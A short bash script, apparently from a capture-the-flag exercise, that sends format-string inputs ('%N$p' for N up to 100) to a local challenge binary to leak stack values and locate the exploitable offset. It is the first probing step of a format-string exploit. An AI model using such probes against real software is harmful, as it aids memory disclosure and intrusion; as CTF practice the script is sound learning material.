#!/bin/bash

for i in $(seq 100)
do
echo "Offset $i : %$i\$p" | ./chall
done